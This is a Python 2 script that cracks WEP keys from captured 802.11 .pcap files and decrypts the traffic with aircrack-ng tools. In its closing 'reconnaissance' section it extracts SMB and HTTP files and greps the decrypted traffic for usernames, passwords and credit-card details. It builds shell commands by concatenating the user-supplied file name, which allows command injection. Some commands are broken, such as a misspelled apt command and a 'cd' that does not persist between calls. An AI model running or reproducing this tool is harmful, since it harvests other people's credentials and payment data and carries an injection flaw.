#!/usr/bin/python
# -------------------------------------------------------------------------------------
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
#
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
#                               LOAD ANY REQUIRED IMPORTS
# -------------------------------------------------------------------------------------

import os
import sys
import os.path

# -------------------------------------------------------------------------------------
#                               SHOW A UNIVERSAL HEADER
# -------------------------------------------------------------------------------------

print "\nPCAP-CRACKER - SSID AND WEP KEY CRACKER FOR IEEE (802.11) RADIO .PCAP FILES"
print "\n          BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)\n"

# -------------------------------------------------------------------------------------
#                 CONDUCT ROUTINE AND SIMPLE TESTS ON SUPPLIED ARGUEMENTS
# -------------------------------------------------------------------------------------

countargs = len(sys.argv)

if countargs < 2:
    print "\nUse the command python pcap-cracker.py wiresharkfile.pcap\n"
    exit()

if os.geteuid() != 0:
    print "\nPlease run the python script as root..."
    exit()

file = sys.argv[1]

if os.path.exists(file) == 0:
    print "\nFile " + file + " was not found, did you spell it correctly?"
    exit()

# -------------------------------------------------------------------------------------
#             CHECK ALL REQUIRED DEPENDENCIES ARE INSTALLED ON THE SYSTEM.
# -------------------------------------------------------------------------------------

installed = 0
check = os.system("type pcapfix > /dev/null")

if check > 0:
    print "Installing pcapfix...\n"
    os.system("apt-get install pcapfix")
    installed=1


check = os.system("type airmon-ng > /dev/null") 

if check > 0:
    print "Installing aircrack-ng...\n"
    os.system("apt-get install build-essential")
    os.system("apt-get install libssl-dev")
    os.system("apt-get install subversion")
    os.system("apt-get install checkinstall")
    os.system("git clone https://github.com/aircrack-ng/aircrack-ng.git")
    os.system("cd aircrack-ng")
    os.system("make experimental=true")
    os.system("make install")
    os.system("cd..")
    os.system("airodump-ng-oui-update")
    installed=1

check = os.system("type tshark > /dev/null") 

if check > 0:
    print "Installing tshark...\n"
    os.system("add-apt-repositorty ppa:dreibh/ppa")
    os.system("apt-get install wireshark")
    os.system("apt-get install tshark")
    installed=1

if installed == 0:
    print "\nAll required dependencies are pre-installed...\n"

if installed == 1:
    print "\nMissing dependencies have been installed for you...\n"

# -------------------------------------------------------------------------------------
#     SOMETIMES CAPTURED .PCAP FILES GET CUT OFF OR ARE CORRUPTED IN OTHER WAYS
# -------------------------------------------------------------------------------------

os.system("pcapfix -d " + file + " -o Fixerror.pcap > /dev/null")

check = os.system("type Fixerror.pcap > /dev/null")

if check == 0:
    os.system("mv " + file + " Oldpcapfile.pcap")
    os.system("mv Fixerror.pcap " + file)
    print "\nErrors in the file have been fixed..."
    print "\nYour orginal file " + file + " has been renamed Oldpcapfile.pcap."

# -------------------------------------------------------------------------------------
#                       NEXT EXTRACT THE SSID FROM THE .PCAP FILE
# -------------------------------------------------------------------------------------

os.system("tcpdump -ennr " + file + " '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt")
with open('SSID.txt', 'r') as myfile:
  SSID = myfile.read().replace('\n', '')
os.system("rm SSID.txt")
SSID = "00:" + SSID
os.system("echo " + SSID + " > SSID.txt")

# -------------------------------------------------------------------------------------
#           NOW LETS EXTRACT THE WEP KEY FROM THE .PCAP FILE USING THE SSID
# -------------------------------------------------------------------------------------

os.system("aircrack-ng -b " + SSID + " " + file + " > Key.txt")
os.system("grep -o '![^\"]*' Key.txt > Key2.txt")
os.system("cat Key2.txt | sed 's/[^a-z  A-Z 0-1 :]//g' > Key3.txt")
os.system("cat Key3.txt | tr -d ' \t\n\r' > WepKey.txt")
os.system("rm Key.txt")
os.system("rm Key2.txt")
os.system("rm Key3.txt")
with open('WepKey.txt', 'r') as myfile:
  WEP = myfile.read().replace('\n', '')

# -------------------------------------------------------------------------------------
#           USING THE WEP KEY CREATE A CRACKED VERSION OF THE .PCAP FILE
# -------------------------------------------------------------------------------------

os.system("airdecap-ng -w " + WEP + " "+ file +" " + "> /dev/null")
file = file[:-1]
file = file[:-1]
file = file[:-1]
file = file[:-1]
file = file[:-1]
file = file + "-dec.pcap"
os.system("mv " + file + " Cracked.pcap")

# -------------------------------------------------------------------------------------
#                  NOW CONDUCT SOME RECONISSANCE ON THE CRACKED FILE
# -------------------------------------------------------------------------------------

os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
os.system("ngrep -q -I Cracked.pcap|grep -i username > Username.txt")
os.system("ngrep -q -I Cracked.pcap|grep -i password > Password.txt")
os.system("ngrep -q -I Cracked.pcap|grep -i Credit > Creditcard.txt")
print "\nAll done!!, take a look...\n"
os.system("ls")
exit()
#EOF


